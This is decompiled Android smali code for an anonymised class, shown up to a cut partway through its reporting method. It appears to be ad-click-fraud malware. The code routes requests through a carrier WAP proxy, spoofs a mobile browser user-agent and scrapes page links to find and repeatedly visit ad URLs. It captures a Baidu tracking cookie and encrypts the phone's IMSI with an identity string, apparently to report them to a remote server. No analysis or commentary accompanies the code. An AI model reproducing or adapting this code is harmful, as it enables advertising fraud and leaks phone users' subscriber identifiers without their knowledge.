.class public Lcom/xxx/yyy/BBBB;
.super Ljava/lang/Object;
.source "BBBB.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/xxx/yyy/BBBB$LogRedirectHandler;
    }
.end annotation


# instance fields
.field TAG:Ljava/lang/String;

.field private adurl:Ljava/lang/String;

.field private context:Landroid/content/Context;

.field private cookieStore:Lorg/apache/http/client/CookieStore;

.field public docount:I

.field private dotype:I

.field public gwul:Ljava/lang/String;

.field public hmul:Ljava/lang/String;

.field private httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

.field public identity:Ljava/lang/String;

.field public imsi:Ljava/lang/String;

.field private iswap:I

.field private key:Ljava/lang/String;

.field private myCookie:Ljava/lang/String;

.field public prul:Ljava/lang/String;

.field private randomDoCount:I

.field private redirectUrl:Ljava/lang/String;

.field private refer:Ljava/lang/String;

.field private response:Lorg/apache/http/HttpResponse;

.field private result:I

.field private urls:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILandroid/content/Context;Ljava/lang/String;)V
    .locals 3
    .param p1, "dc"    # I
    .param p2, "id"    # Ljava/lang/String;
    .param p3, "gw"    # Ljava/lang/String;
    .param p4, "hm"    # Ljava/lang/String;
    .param p5, "pr"    # Ljava/lang/String;
    .param p6, "im"    # Ljava/lang/String;
    .param p7, "iw"    # I
    .param p8, "ct"    # Landroid/content/Context;
    .param p9, "key"    # Ljava/lang/String;

    .prologue
    const-string v2, ""

    .line 63
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 48
    const-string v1, "MyTag"

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->TAG:Ljava/lang/String;

    .line 50
    const-string v1, ""

    iput-object v2, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    .line 61
    const/4 v1, 0x0

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    .line 62
    const-string v1, ""

    iput-object v2, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 66
    iput-object p8, p0, Lcom/xxx/yyy/BBBB;->context:Landroid/content/Context;

    .line 67
    iput p1, p0, Lcom/xxx/yyy/BBBB;->docount:I

    .line 68
    iput-object p2, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    .line 69
    iput-object p3, p0, Lcom/xxx/yyy/BBBB;->gwul:Ljava/lang/String;

    .line 70
    iput-object p4, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    .line 71
    iput-object p5, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    .line 72
    iput-object p6, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    .line 73
    iput p7, p0, Lcom/xxx/yyy/BBBB;->iswap:I

    .line 74
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    .line 75
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    .line 76
    iget-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    new-instance v2, Lcom/xxx/yyy/BBBB$LogRedirectHandler;

    invoke-direct {v2, p0}, Lcom/xxx/yyy/BBBB$LogRedirectHandler;-><init>(Lcom/xxx/yyy/BBBB;)V

    invoke-virtual {v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->setRedirectHandler(Lorg/apache/http/client/RedirectHandler;)V

    .line 78
    iget-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v1

    .line 79
    const-string v2, "compatibility"

    .line 78
    invoke-static {v1, v2}, Lorg/apache/http/client/params/HttpClientParams;->setCookiePolicy(Lorg/apache/http/params/HttpParams;Ljava/lang/String;)V

    .line 81
    iget v1, p0, Lcom/xxx/yyy/BBBB;->iswap:I

    if-nez v1, :cond_0

    .line 83
    new-instance v0, Lorg/apache/http/HttpHost;

    const-string v1, "10.0.0.172"

    const/16 v2, 0x50

    invoke-direct {v0, v1, v2}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;I)V

    .line 84
    .local v0, "proxy":Lorg/apache/http/HttpHost;
    iget-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v1

    const-string v2, "http.route.default-proxy"

    invoke-interface {v1, v2, v0}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 86
    .end local v0    # "proxy":Lorg/apache/http/HttpHost;
    :cond_0
    const/4 v1, 0x2

    const/4 v2, 0x4

    invoke-direct {p0, v1, v2}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v1

    iput v1, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    .line 87
    iput-object p9, p0, Lcom/xxx/yyy/BBBB;->key:Ljava/lang/String;

    .line 88
    return-void
.end method

.method private FindHttpHead(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 11
    .param p1, "body"    # Ljava/lang/String;
    .param p2, "url"    # Ljava/lang/String;

    .prologue
    const/4 v6, 0x0

    const-string v10, "/"

    const-string v9, "https://"

    const-string v7, "http://"

    const-string v8, ""

    .line 363
    const-string v0, ""

    .line 364
    .local v0, "head":Ljava/lang/String;
    const-string v5, "<base href"

    invoke-virtual {p1, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    if-lez v5, :cond_1

    .line 367
    const-string v4, "base href=\".*?\""

    .line 368
    .local v4, "regex":Ljava/lang/String;
    invoke-static {v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v3

    .line 369
    .local v3, "pt":Ljava/util/regex/Pattern;
    invoke-virtual {v3, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 370
    .local v2, "mt":Ljava/util/regex/Matcher;
    :goto_0
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-nez v5, :cond_0

    move-object v1, v0

    .line 391
    .end local v0    # "head":Ljava/lang/String;
    .end local v2    # "mt":Ljava/util/regex/Matcher;
    .end local v3    # "pt":Ljava/util/regex/Pattern;
    .end local v4    # "regex":Ljava/lang/String;
    .local v1, "head":Ljava/lang/String;
    :goto_1
    return-object v1

    .line 371
    .end local v1    # "head":Ljava/lang/String;
    .restart local v0    # "head":Ljava/lang/String;
    .restart local v2    # "mt":Ljava/util/regex/Matcher;
    .restart local v3    # "pt":Ljava/util/regex/Pattern;
    .restart local v4    # "regex":Ljava/lang/String;
    :cond_0
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v5

    const-string v6, "base href=\"|\""

    const-string v7, ""

    invoke-virtual {v5, v6, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "&amp;"

    const-string v7, "&"

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    .line 379
    .end local v2    # "mt":Ljava/util/regex/Matcher;
    .end local v3    # "pt":Ljava/util/regex/Pattern;
    .end local v4    # "regex":Ljava/lang/String;
    :cond_1
    const-string v5, "http://"

    invoke-virtual {p2, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 381
    const-string v5, "http://"

    const-string v5, ""

    invoke-virtual {p2, v7, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 382
    const-string v5, "/"

    invoke-virtual {v0, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v0, v6, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 383
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "http://"

    invoke-direct {v5, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_2
    :goto_2
    move-object v1, v0

    .line 391
    .end local v0    # "head":Ljava/lang/String;
    .restart local v1    # "head":Ljava/lang/String;
    goto :goto_1

    .line 385
    .end local v1    # "head":Ljava/lang/String;
    .restart local v0    # "head":Ljava/lang/String;
    :cond_3
    const-string v5, "https://"

    invoke-virtual {p2, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 387
    const-string v5, "https://"

    const-string v5, ""

    invoke-virtual {p2, v9, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 388
    const-string v5, "/"

    invoke-virtual {v0, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v0, v6, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 389
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "https://"

    invoke-direct {v5, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2
.end method

.method private FixUrls(Ljava/lang/String;Ljava/lang/String;)V
    .locals 10
    .param p1, "body"    # Ljava/lang/String;
    .param p2, "head"    # Ljava/lang/String;

    .prologue
    .line 301
    const-string v5, "<a.*?/a>"

    .line 302
    .local v5, "regex":Ljava/lang/String;
    invoke-static {v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v3

    .line 303
    .local v3, "pt":Ljava/util/regex/Pattern;
    invoke-virtual {v3, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    .line 304
    .local v1, "mt":Ljava/util/regex/Matcher;
    :cond_0
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-nez v7, :cond_1

    .line 360
    :goto_0
    return-void

    .line 309
    :cond_1
    const-string v6, "a href=\".*?\""

    .line 310
    .local v6, "s3":Ljava/lang/String;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "*"

    invoke-virtual {v7, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v7

    if-lez v7, :cond_2

    .line 312
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    const/4 v8, 0x1

    if-ne v7, v8, :cond_0

    .line 314
    invoke-static {v6}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v4

    .line 315
    .local v4, "pt3":Ljava/util/regex/Pattern;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 316
    .local v2, "mt3":Ljava/util/regex/Matcher;
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-eqz v7, :cond_0

    .line 320
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "a href=\"|\""

    const-string v9, ""

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "&amp;"

    const-string v9, "&"

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    goto :goto_0

    .line 327
    .end local v2    # "mt3":Ljava/util/regex/Matcher;
    .end local v4    # "pt3":Ljava/util/regex/Pattern;
    :cond_2
    invoke-static {v6}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v4

    .line 328
    .restart local v4    # "pt3":Ljava/util/regex/Pattern;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 329
    .restart local v2    # "mt3":Ljava/util/regex/Matcher;
    :goto_1
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-eqz v7, :cond_0

    .line 330
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "a href=\"|\""

    const-string v9, ""

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "&amp;"

    const-string v9, "&"

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 334
    .local v0, "link":Ljava/lang/String;
    const-string v7, "http://"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_3

    .line 336
    const-string v7, "./"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 338
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v8, 0x2

    invoke-virtual {v0, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 356
    :cond_3
    :goto_2
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_1

    .line 340
    :cond_4
    const-string v7, "/"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 342
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v8, 0x1

    invoke-virtual {v0, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    .line 344
    :cond_5
    const-string v7, "../"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_6

    .line 346
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v8, 0x3

    invoke-virtual {v0, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    .line 350
    :cond_6
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2
.end method

.method private GetRandomFromMinToMax(II)I
    .locals 5
    .param p1, "min"    # I
    .param p2, "max"    # I

    .prologue
    .line 292
    new-instance v0, Ljava/util/Date;

    invoke-direct {v0}, Ljava/util/Date;-><init>()V

    .line 293
    .local v0, "currentTime":Ljava/util/Date;
    new-instance v1, Ljava/util/Random;

    invoke-virtual {v0}, Ljava/util/Date;->getTime()J

    move-result-wide v3

    invoke-direct {v1, v3, v4}, Ljava/util/Random;-><init>(J)V

    .line 294
    .local v1, "rd":Ljava/util/Random;
    invoke-virtual {v1, p2}, Ljava/util/Random;->nextInt(I)I

    move-result v3

    add-int v2, p1, v3

    .line 297
    .local v2, "ret":I
    return v2
.end method

.method private HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .param p1, "url"    # Ljava/lang/String;
    .param p2, "ref"    # Ljava/lang/String;

    .prologue
    const-string v11, ""

    .line 169
    new-instance v5, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v5, p1}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 170
    .local v5, "method":Lorg/apache/http/client/methods/HttpGet;
    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v9

    if-lez v9, :cond_0

    .line 171
    const-string v9, "Referer"

    invoke-virtual {v5, v9, p2}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 181
    :cond_0
    const-string v9, "User-Agent"

    const-string v10, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 182
    const-string v9, "Accept"

    const-string v10, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 188
    :try_start_0
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    if-eqz v9, :cond_1

    .line 189
    new-instance v4, Lorg/apache/http/protocol/BasicHttpContext;

    invoke-direct {v4}, Lorg/apache/http/protocol/BasicHttpContext;-><init>()V

    .line 190
    .local v4, "localContext":Lorg/apache/http/protocol/BasicHttpContext;
    const-string v9, "http.cookie-store"

    iget-object v10, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    invoke-virtual {v4, v9, v10}, Lorg/apache/http/protocol/BasicHttpContext;->setAttribute(Ljava/lang/String;Ljava/lang/Object;)V

    .line 191
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v9, v5, v4}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;Lorg/apache/http/protocol/HttpContext;)Lorg/apache/http/HttpResponse;

    move-result-object v9

    iput-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    .line 196
    .end local v4    # "localContext":Lorg/apache/http/protocol/BasicHttpContext;
    :goto_0
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v9}, Lorg/apache/http/impl/client/DefaultHttpClient;->getCookieStore()Lorg/apache/http/client/CookieStore;

    move-result-object v9

    iput-object v9, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    .line 198
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-interface {v9}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v9

    invoke-interface {v9}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v7

    .line 210
    .local v7, "status":I
    const/16 v9, 0xc8

    if-eq v7, v9, :cond_2

    .line 256
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 211
    const-string v9, ""

    move-object v9, v11

    .line 254
    .end local v7    # "status":I
    :goto_1
    return-object v9

    .line 194
    :cond_1
    :try_start_1
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v9, v5}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v9

    iput-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;
    :try_end_1
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    .line 237
    :catch_0
    move-exception v9

    move-object v1, v9

    .line 239
    .local v1, "e":Lorg/apache/http/client/ClientProtocolException;
    :try_start_2
    invoke-virtual {v1}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 256
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 242
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 213
    .end local v1    # "e":Lorg/apache/http/client/ClientProtocolException;
    .restart local v7    # "status":I
    :cond_2
    :try_start_3
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    const-string v10, "Set-Cookie"

    invoke-interface {v9, v10}, Lorg/apache/http/HttpResponse;->getFirstHeader(Ljava/lang/String;)Lorg/apache/http/Header;

    move-result-object v3

    .line 214
    .local v3, "head":Lorg/apache/http/Header;
    const/4 v8, 0x0

    .line 215
    .local v8, "tmpCookie":Ljava/lang/String;
    if-eqz v3, :cond_3

    .line 216
    invoke-interface {v3}, Lorg/apache/http/Header;->getValue()Ljava/lang/String;

    move-result-object v8

    .line 217
    :cond_3
    if-eqz v8, :cond_4

    const-string v9, "BAIDU_WISE_UID"

    invoke-virtual {v8, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 218
    iput-object v8, p0, Lcom/xxx/yyy/BBBB;->myCookie:Ljava/lang/String;

    .line 220
    :cond_4
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-interface {v9}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v2

    .line 230
    .local v2, "entity":Lorg/apache/http/HttpEntity;
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-virtual {p0, v9}, Lcom/xxx/yyy/BBBB;->getContentCharset(Lorg/apache/http/HttpResponse;)Ljava/lang/String;

    move-result-object v0

    .line 231
    .local v0, "charset":Ljava/lang/String;
    invoke-interface {v2}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v9

    invoke-virtual {p0, v9, v0}, Lcom/xxx/yyy/BBBB;->generateString(Ljava/io/InputStream;Ljava/lang/String;)Ljava/lang/String;
    :try_end_3
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    move-result-object v6

    .line 256
    .local v6, "result":Ljava/lang/String;
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    move-object v9, v6

    .line 236
    goto :goto_1

    .line 243
    .end local v0    # "charset":Ljava/lang/String;
    .end local v2    # "entity":Lorg/apache/http/HttpEntity;
    .end local v3    # "head":Lorg/apache/http/Header;
    .end local v6    # "result":Ljava/lang/String;
    .end local v7    # "status":I
    .end local v8    # "tmpCookie":Ljava/lang/String;
    :catch_1
    move-exception v9

    move-object v1, v9

    .line 245
    .local v1, "e":Ljava/io/IOException;
    :try_start_4
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 256
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 248
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 249
    .end local v1    # "e":Ljava/io/IOException;
    :catch_2
    move-exception v9

    move-object v1, v9

    .line 251
    .local v1, "e":Ljava/lang/Exception;
    :try_start_5
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 256
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 254
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 255
    .end local v1    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v9

    .line 256
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 257
    throw v9
.end method

.method private PostResult(I)V
    .locals 5
    .param p1, "result"    # I

    .prologue
    const-string v3, "&"

    .line 522
    const-string v1, ""

    .line 524
    .local v1, "tmpIm":Ljava/lang/String;
    :try_start_0
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "&"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->key:Ljava/lang/String;

    invoke-static {v3, v4}, Lcom/xxx/yyy/ddda;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 529
    :goto_0
    const-string v2, ""

    .line 530
    .local v2, "url":Ljava/lang/String;
